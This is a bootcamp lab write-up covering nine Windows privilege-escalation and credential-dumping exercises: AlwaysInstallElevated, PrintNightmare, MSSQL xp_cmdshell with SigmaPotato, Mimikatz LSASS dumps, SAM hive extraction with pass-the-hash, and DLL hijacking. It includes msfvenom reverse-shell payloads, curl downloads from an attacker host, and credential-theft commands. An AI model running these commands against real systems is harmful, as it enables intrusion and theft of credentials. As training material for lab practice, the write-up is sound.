# Network Reconnaissance and Compromise of Network Infrastructure - Day 7

## Overview
This document outlines the labs completed on 08/06/2025 during the hacking bootcamp, focusing on network reconnaissance and compromise of Windows network infrastructure. [Hints for the labs](https://md.cyber-ed.ru/s/gd8q92E50).

## Table of Contents
- [Lab 1: Privilege Escalation on Windows Network](#lab-1-privilege-escalation-on-windows-network)
- [Lab 2: Print Nightmare](#lab-2-print-nightmare)
- [Lab 3: Privilege Escalation on Windows Network (via MSSQL)](#lab-3-privilege-escalation-on-windows-network-via-mssql)
- [Lab 4: Finding Credentials in Plaintext](#lab-4-finding-credentials-in-plaintext)
- [Lab 5: Dump LSASS Process in Windows](#lab-5-dump-lsass-process-in-windows)
- [Lab 6: Dump SAM Credentials from SAM and System Database](#lab-6-dump-sam-credentials-from-sam-and-system-database)
- [Lab 7: Privilege Escalation via Impersonation](#lab-7-privilege-escalation-via-impersonation)
- [Lab 8: DLL Hijacking](#lab-8-dll-hijacking)
- [Lab 9: SeBackupPrivilege Abuse](#lab-9-sebackupprivilege-abuse)

## Labs

### Lab 1: Privilege Escalation on Windows Network
#### Objective
Escalate privileges on a Windows network by exploiting misconfigured permissions. 

#### Vulnerabilities
- Misconfigured Permissions: Excessive user privileges allow unauthorized access to administrative resources.

#### Requirements
Target Windows server must be accessible with valid domain credentials.

#### Steps
1. **Setup**
   - Verify connectivity to the target server.
   ```bash
   ping <SERVER_IP>
   ```
2. **Connect to the workstation and check for vulnerability**
   - Connection with xfreerdp3 client with shared drive, clipboard etc
   ```bash
   xfreerdp3 /v:<WORKSTATION_IP> /u:<USERNAME> /p:'<PASSWORD>' /dynamic-resolution /drive:linux,/home/kali/shared
 +clipboard
   ```
   - Check for vulnerability
   ```powershell
   reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```
   - If vulnerable, it will return `AlwaysInstallElevated    REG_DWORD    0x1`
3. **Exploitation**
   - Generate a payload on kali with msfvenom.
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f msi -o evil.msi
   ```
   - Copy the payload to the Workstation by placing it in the shared folder, or serving it over python server.
   - Start a listener on Kali `nc -nlvp <PORT>`
   - Execute the payload (evil.msi) and catch the shell. Find the flag in the desktop directory of the user john.

#### Why It Works
Misconfigured permissions grant low-privileged users access to sensitive resources, enabling privilege escalation.

#### Alternatives
- TO-DO

#### Resources
- [Impacket Documentation: https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

#### Notes
- Ensure valid credentials are available for enumeration.

---

### Lab 2: Print Nightmare
#### Objective
Exploit the Print Nightmare vulnerability to gain system-level access on a Windows machine.

#### Vulnerabilities
- Print Nightmare (CVE-2021-34527): Unauthenticated remote code execution in the Windows Print Spooler service.

#### Requirements
Target Windows machine must have Print Spooler service enabled and unpatched.

#### Steps
1. **Setup**
   - Verify connectivity to the target.
   ```bash
   ping <TARGET_IP>
   ```
2. **Reconnaissance**
   - Confirm Print Spooler service is running. (optional)
   ```bash
   nmap -p 445 --script smb-vuln-cve-2021-34527 <TARGET_IP>
   ```
   - Check if the target is vulnerable with impacket
   ```bash
    impacket-rpcdump <USER>:<PASSWORD>@<TARGET_IP> | egrep 'MS-RPRN|MS-PAR'
    ```
    - If found, then proceed to exploitation. But you could also enumerate the domain
    ```bash
     $ impacket-smbserver share <PATH-TO-PAYLOAD> -smb2support
     $ impacket-lookupsid <USER>:<PASSWORD>@<TARGET_IP> 
    ```
3. **Exploitation**
   - Generate a payload using msfvenom
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<our-ip> LPORT=<LISTENING_PORT> -f dll -o payload.dll
   ``
   - Start a netcat listener `nc -nlvp <LISTENING_PORT>`
   - Download and use [PrintNightmare exploit](https://github.com/nathanealm/PrintNightmare-Exploit) to execute a malicious DLL.
   ```bash
   $ python3 CVE-2021-1675.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> '<MALICIOUS_DLL_PATH>'
   $ python3 CVE-2021-1675.py DEKSTOP-NNMPL2T/User:123456@10.10.0.14 '\\\\<ATTACKER_IP>>\\share\\payload.dll' [ This is an example ]
   ```

#### Why It Works
Print Nightmare exploits a flaw in the Print Spooler service, allowing unauthenticated users to execute arbitrary code with SYSTEM privileges.

#### Alternatives
- Use Metasploit’s PrintNightmare module for automated exploitation.

#### Resources
- [CVE-2021-34527 Details: https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527](https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527)

#### Notes
- Ensure the target is unpatched (pre-July 2021).

---

### Lab 3: Privilege Escalation on Windows Network (via MSSQL)
#### Objective
Escalate privileges on a Windows network by exploiting MSSQL to gain a system shell.

#### Vulnerabilities
- Weak MSSQL Credentials: Default or guessable credentials allow command execution via xp_cmdshell.
- SeImpersonate Privilege: Enables privilege escalation using SigmaPotato.

#### Requirements
MSSQL server must be running on the target at port 1433 with weak credentials.

#### Steps
1. **Setup**
   - Verify connectivity to the MSSQL server.
   ```bash
   ping 10.10.0.46
   ```
2. **Reconnaissance**
   - Brute-force MSSQL credentials using a wordlist.
   ```bash
   hydra -C ~/SecLists/.../mssql-betterdefaultpasslist.txt 10.10.0.46 mssql -s 1433 -t 8 -f
   ```
3. **Exploitation**
   - Log in to MSSQL with obtained credentials (e.g., sa:Pass@123).
   ```bash
   python3 mssqlclient.py sa:"Pass@123"@10.10.0.46
   ```
   - Enable and use xp_cmdshell to inject a reverse shell.
   ```sql
    enable_xp_cmdshell
    RECONFIGURE
   ```
   - Generate a reverse shell in [revshells.com](https://www.revshells.com/) in powershell, base64 format, then start a listener `nc -nlvp<PORT>` and execute in base64 encoded powershell script in the mssql server console.
   ```bash
    xp_cmdshell powershell -e <BASE64_ENCRYPTED_REVERSE_SHELL>
   ```
   
   - When your listener catches the shell, check for SeImpersonate privilege.
   ```bash
   whoami /priv
   ```
   - Serve SigmaPotato executable via a Python server.
   ```bash
   python3 -m http.server 80
   ```
   - Download SigmaPotato to the target’s writable Public directory.
   ```bash
   curl http://<ATTACKER_IP>/SigmaPotato.exe -o C:\Users\Public\SigmaPotato.exe
   ```
   - Start a listener on a different port in your machine and execute SigmaPotato for a reverse shell.
   ```bash
   .\SigmaPotato.exe --revshell <ATTACKER_IP> <ATTACKER_PORT>
   ```

#### Why It Works
Weak MSSQL credentials allow command execution via xp_cmdshell, and SeImpersonate privilege enables escalation to SYSTEM using SigmaPotato.
 
#### Alternatives
- Use Metasploit’s MSSQL module for automated shell delivery.

#### Resources
- [MSSQL xp_cmdshell Guide: https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/)
- [SigmaPotato: https://github.com/tylerdotrar/SigmaPotato/releases/tag/v1.2.6](https://github.com/tylerdotrar/SigmaPotato/releases/tag/v1.2.6)

#### Notes
- Ensure a listener is active before triggering the reverse shell.
- Download SigmaPotato and the wordlist if not already available.

---

### Lab 4: Finding Credentials in Plaintext
#### Objective
Locate and crack credentials stored on a Windows system.

#### Vulnerabilities
- Insecure Storage: Plaintext credentials in configuration files or memory.

#### Requirements
Target Windows machine must be accessible with user-level credentials.

#### Steps
1. **Setup**
   - Verify access to the target system.
   ```bash
   net use \\<TARGET_IP>
   ```
   - Connect to the workstation via RDP
   ```bash
   xfreerdp /u:<USER> /p:<PASSWORD> /v:<WORKSTATION_IP> +clipboard +home-drive
   ```
2. **Reconnaissance**
   - Search for configuration files containing credentials. You can search directories manually too. In our case, Secret.kdb was found in C:\
   ```bash
   findstr /si "password" C:\*.config [Example]
   ```
3. **Exploitation**
   - We need to decrypt Secret.kdp. First dump the hash with keepass2john and then crack it.
   ```bash
   $ keepass2john Secret.kdb > hash.txt
   $ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
   $ hashcat -O --user hash.txt -m 13400 /usr/share/wordlists/rockyou.txt.gz [ Alternative ]
   ```
   - When you obtain the password, connect to the database `keepassxc Secret.kdb`, load it in a new database, find the flag in the field of one of the tables.

#### Why It Works
Weaked passwords can easily be cracked with various tools such as john the ripper, hashcat etc.

#### Alternatives
- TO-DO.

#### Resources
- [Windows Credential Dumping Guide: https://www.hacktricks.xyz/windows/credentials](https://www.hacktricks.xyz/windows/credentials)

#### Notes
- Check common locations like C:\Windows and C:\Users for config files.
- Install the keypassx client if not already available.

---

### Lab 5: Dump LSASS Process in Windows
#### Objective
Extract credentials by dumping the LSASS process memory on a Windows machine.

#### Vulnerabilities
- LSASS Exposure: Unprotected LSASS process stores plaintext credentials or hashes.

#### Requirements
Target Windows machine must be accessible with limited privileges.

#### Steps
1. **Setup**
   - Connect to target via rdp.
   ```bash
   xfreerdp3 /u:<USER> /p:'<PASSWORD>' /compression /bpp:16 /v:<WORKSTATION_IP> /wallpaper /themes /window-drag 
/menu-anims /fonts /compression /rfx /rfx-mode:video /w:1024 /h:768 /network:auto /dynamic-resolution /drive:home,$(pwd)/www
   ```
   - Download or copy mimikatz to the target workstation. 
2. **Reconnaissance**
   - Confirm LSASS process is running.
    ```bash
   tasklist | findstr lsass
   ```
3. **Exploitation**
   - Dump LSASS process using Mimikatz.
   ```bash
   mimikatz.exe > "privilege:debug"
   mimikatz.exe > "sekurlsa::logonpasswords"
   ```
   - Connect to the Administrator user with the obtained password hash
   ```bash
   $ xfreerdp3 /u:Administrator /pth:'<OBTAINED_HASH>' /v:<WORKSTATION_IP> +clipboard +drive:kali,/home/kali/Desktop
   $ evil-winrm -i <WORKSTATION_IP> -u Administrator -H <OBTAINED_HASH> [Alternative]
   ```
#### Why It Works
LSASS stores credentials in memory, which Mimikatz can extract it using the debugging privileges.

#### Alternatives
- TO-DO

#### Resources
- [Mimikatz Documentation: https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

#### Notes
- Run Mimikatz with elevated privileges (e.g debug) to access LSASS.
- Install or download evil-winrm if not available.

---

### Lab 6: Dump SAM Credentials from SAM and System Database
#### Objective
Extract credentials from the SAM and SYSTEM registry hives on a Windows machine.

#### Vulnerabilities
- SAM Database Exposure: Password hashes in SAM can be extracted with  access.

#### Requirements
Target Windows machine must be accessible with a user with limited permissions.

#### Steps
1. **Setup**
   - Connect to the machine via xfreerdp or xfreerdp3.
   ```bash
    xfreerdp /u:<USER> /p:'<PASSWORD>' /compression /bpp:16 /v:<WORKSTATION_IP> /wallpaper /themes /window-drag 
/menu-anims /fonts /compression /rfx /rfx-mode:video /w:1024 /h:768 /network:auto /dynamic-resolution /drive:home,$(pwd)/www
   ```

2. **Check if vulnerable**
   - Verify the privileges of the user in a powershell console. 
   ```bash
   whoami /priv
   ```
   - If Bypass path traversal is enabled, then it vulnerable.
3. **Exploitation**
   - Dump the sam and system database
   ```bash
   $ reg save HKLM\sam sam
   $ reg save HKLM\system system
   ```
   - Copy the sam and system files to your kali machine using shared folder or updog webserver or drag and drop.
   - Dump SAM and SYSTEM hives using Impacket.
   ```bash
   impacket-secretsdump -sam <PATH_TO_SAM> -system <PATH_TO_SYSTEM> LOCAL
   ```
   - You will obtain the NTLM hashes for some users including Administrator. Use psexec to obtain an admin shell with the hashes, then find the flag in the desktop.
   ```bash
   impacket-psexec -hashes :<ADMIN_PASSWORD_HASH> Administrator@<WORKSTATION_IP>
   ```
#### Why It Works
The SAM database stores user credential hashes, which can be extracted with misconfigured user privileges for offline cracking or direct login.

#### Alternatives
- TO-DO

#### Resources
- [Impacket SecretsDump: https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

#### Notes
- Save hives to a writable directory before dumping.

---

### Lab 7: Privilege Escalation via Impersonation
#### Objective
Escalate privileges by exploiting token impersonation vulnerabilities.

#### Vulnerabilities
- SeImpersonate Privilege: Allows impersonation of privileged tokens to gain SYSTEM access.

#### Requirements
Target Windows machine must grant SeImpersonate privilege to the user.

#### Steps
1. **Setup**
   - Verify user privileges.
   ```bash
   whoami /priv
   ```
2. **Reconnaissance**
   - Confirm SeImpersonate privilege is enabled.
   ```bash
   whoami /priv | findstr SeImpersonate
   ```
3. **Exploitation**
   - Use SigmaPotato to exploit SeImpersonate for a SYSTEM shell.
   - Start a net cat listener on your attacking machine `nc -nlvp <LISTENING PORT>`
   - Download SigmaPotatoe.exe into the workstation and execute the command to get a shell
   ```bash
   .\SigmaPotatoe.exe --revshell <ATTACKER_IP> <LISTENING_PORT>
   ```

#### Why It Works
SeImpersonate allows attackers to impersonate privileged tokens, escalating to SYSTEM privileges.

#### Alternatives
- Use RoguePotato or JuicyPotatoe for similar token impersonation exploits.

#### Resources
- [JuicyPotato Guide: https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)

#### Notes
- Ensure a listener is active for the reverse shell.

---

### Lab 8: DLL Hijacking
#### Objective
Escalate privileges by exploiting DLL hijacking on a Windows application. [SOLUTION IS NOT COMPLETE AT THE MOMENT: TO-DO]

#### Vulnerabilities
- DLL Hijacking: Applications loading untrusted DLLs from writable directories.

#### Requirements
Target Windows machine must have a vulnerable application installed.

#### Steps
1. **Setup**
   - Verify access to the target system.
   ```bash
   net use \\<TARGET_IP>
   ```
2. **Reconnaissance**
   - Identify applications loading DLLs from writable paths. You will see ITHelper program that says "Pentest.dll" not found.
   ```bash
   procmon.exe
   ```
3. **Exploitation**
   - Create a malicious Pentest.dll with a msfvenom
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LISTENING_PORT> -f dll -o Pentest.dll
   ```
   - Start a net cat listener in your attacking machine  `nc -nlvp <LISTENING_PORT>
   - Place a malicious DLL in the writable directory in C:\MyProgram.
   ```bash
   copy Pentests.dll C:\Users\<APP_PATH>
   ```

#### Why It Works
Applications loading DLLs without full path validation execute malicious DLLs, granting attacker-controlled code execution.

#### Alternatives
- Use PowerShell to monitor DLL loading behavior.

#### Resources
- [DLL Hijacking Guide: https://www.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking](https://www.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking)

#### Notes
- Use Process Monitor to identify vulnerable DLL paths.

---

### Lab 9: SeBackupPrivilege Abuse
#### Objective
Escalate privileges by abusing the SeBackupPrivilege to access sensitive files.

#### Vulnerabilities
- SeBackupPrivilege: Allows users to read any file, bypassing access controls.

#### Requirements
Target Windows machine must grant SeBackupPrivilege to the user.

#### Steps
1. **Setup**
   - Verify user privileges.
   ```bash
   whoami /priv
   ```
   - Find temp user credentials in the public folder and connect with them
2. **Reconnaissance**
   - Confirm SeBackupPrivilege is enabled.
   ```bash
   whoami /priv | findstr SeBackupPrivilege
   ```
3. **Exploitation**
   - Use robocopy to copy sensitive files (e.g., SAM hive).
   ```powershell
   robocopy "C:\Users\Administrator\Desktop" "C:\Users\user_temp\Desktop" flag.txt /b /nfl /ndl /COPY:DAT
   ```
   - Get the flag from the Desktop of the shared directory.
   - Alternatively, you can [import malicious DLLS in the powershell](https://github.com/giuliano108/SeBackupPrivilege) to change the permissions with the current user (without switching accounts). 
   - After that, you can dump the ntlm hashes
   ```powershell
      $ reg save HKLM\sam sam
      $ reg save HKLM\system system
   ```
   - Copy the dumps to the attacking machine via shared folder or updog server or drag and drop if available.
   - Use impacket-secretsdump to obtain the password hashes for the administrator password
   ```bash
   impacket-secretsdump -sam <PATH_TO_SAM> -system <PATH_TO_SYSTEM> LOCAL
   ```
   - You will obtain the NTLM hashes for some users including Administrator. Use psexec to obtain an admin shell with the hashes, then find the flag in the desktop.
   ```bash
   impacket-psexec -hashes :<ADMIN_PASSWORD_HASH> Administrator@<WORKSTATION_IP>
   ```

#### Why It Works
SeBackupPrivilege allows reading of restricted files, enabling access to sensitive data like SAM hives for credential extraction.

#### Alternatives
- Use diskshadow to create a shadow copy for file access [NOT VERIFIED].

#### Resources
- [SeBackupPrivilege Guide: https://www.hacktricks.xyz/windows/windows-local-privilege-escalation/sebackupprivilege](https://www.hacktricks.xyz/windows/windows-local-privilege-escalation/sebackupprivilege)

#### Notes
- Ensure a writable directory for copied files.

---